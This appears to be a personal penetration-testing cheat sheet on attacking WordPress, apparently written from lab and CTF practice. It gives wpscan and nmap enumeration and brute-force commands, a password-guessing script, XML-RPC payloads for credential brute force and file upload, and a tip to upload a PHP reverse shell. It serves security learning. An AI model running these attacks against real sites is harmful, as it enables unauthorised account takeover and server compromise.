---
layout: post
title: Wordpress
description: Wordpress
summary: Wordpress
tags: [web,enum,wordpress]
minute: 2
---
## Version
* On meta generators

![](/assets/Wordpress/3101332D-061A-4AFA-ACEA-18A476551E16.png)

* Check interesting URL paths below

## Credentials
* Seems you really need to find valid credentials to wordpress before exploiting
* Try going to `/?author=1` and enumerate from there to see the usernames
* There is no default credentials. Installation will ask user to provide the creds.
* You can guess valid usernames though

![](/assets/Wordpress/FCE001CA-BCC0-44B1-94FF-9B2152812FDF.png)

## Recon
```bash
# Kickoff nmap
nmap -p80 --script http-wordpress-enum,http-wordpress-users 10.10.71.200

# Using wpscan (you can remove api token but some
# information will not be displayed)
# NOTE: wpscan may not report all vulnerabilities specially
# on plugins
wpscan --url http://10.10.10.29 --api-token {API_TOKEN}

# Similar to above but on another path
wpscan --url http://10.10.10.29/wordpress --api-token {API_TOKEN}
```

* Check for `colorlib` in HTML elements. This is a WP plugin.

## Interesting URL Paths
```bash
# you may find version here
/wp-links-opml
/wp-links-opml.php
/readme.html

# uploads directory
/wp-content/uploads/YYYY/DD/FILENAME

# login
/wp-login.php
```

## Interesting files
```bash
# DB credentials
wp-config.php
```

## Brute Force
```bash
# Using nmap
map -p80 --script http-wordpress-brute 10.10.10.29

# User IDs can be extracted from here. You can use
# burp sniper intruder and generate a list of user
# id from 1 to 100 using bash for loop.
curl -s -I -X GET http://10.10.10.29/?author=1

# You can use this python script from
# https://github.com/relarizky/wpxploit
# This can take around 30 minutes to complete
# TIP: try using "admin" as username first
cd ~/data/tools/webapp/wpxploit
./exploit.py http://10.10.127.229/wordpress 5 15

# You can also use wpscan
wpscan --url http://10.10.127.229/wordpress --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

* Once you have the credentials you can try uploading a PHP reverse shell
* TIP: bruteforce is done by sending this POST data containing username and password

```xml
<methodCall>
  <methodName>
    wp.getUsersBlogs
  </methodName>
  <params>
    <param>
      <value>
        admin
      </value>
    </param>
    <param>
      <value>
        gansta1
      </value>
    </param>
  </params>
</methodCall>
```

## Interesting URL Paths
```bash
# most can be reported by wpscan
/wp-content/uploads/
/wp-admin/
/wp-admin/update-core.php
/wp-admin/upgrade.php
/install.php
/wp-cron.php

# can accept post requests if active
/xmlrpc.php

# others
/plugins
/wp-content/plugins
```

For xmlrpc.php, you can use burpsuite to send some POST requests like this.

```
POST /wordpress/xmlrpc.php HTTP/1.1
Host: 10.10.10.29
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 95

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

## XML RPC calls
```bash
# List all method calls
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>

# Get blogs
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>username</value></param>
<param><value>password</value></param>
</params>
</methodCall>

# Uploading a file
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
	<methodName>wp.uploadFile</methodName>
	<params>
		<param><value><string>1</string></value></param>
		<param><value><string>username</string></value></param>
		<param><value><string>password</string></value></param>
		<param>
			<value>
				<struct>
					<member>
						<name>name</name>
						<value><string>filename.jpg</string></value>
					</member>
					<member>
						<name>type</name>
						<value><string>mime/type</string></value>
					</member>
					<member>
						<name>bits</name>
						<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
					</member>
				</struct>
			</value>
		</param>
	</params>
</methodCall>
```

## Themes
* Maybe you can also find theme exploits?

![](/assets/Wordpress/17000E5E-19E8-4681-A8D6-E9D0AA546605.png)

## Plugins
* You can search for plugin exploits also, one way of determining the plugin used is via html elements. Version can also be determined there.

![](/assets/Wordpress/98C48061-F8E3-4613-B122-E45B3D750365.png)

![](/assets/Wordpress/0B054482-2FAF-43DA-B89C-1A847D63C7D9.png)

* You can also add `--plugins-detection aggressive --plugins-version-detection aggressive` in `wpscan`

## Troubleshoting
* Sending `POST` to `/xmlrpc.php` produces 200 OK but with `parse error. not well formed` message most likely caused by [missing php/xml parser library](https://github.com/maxcutler/python-wordpress-xmlrpc/issues/110) inside the server. I encountered this in HTB Tenten.

## References
* [Wordpress - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress)
* HTB Tenten
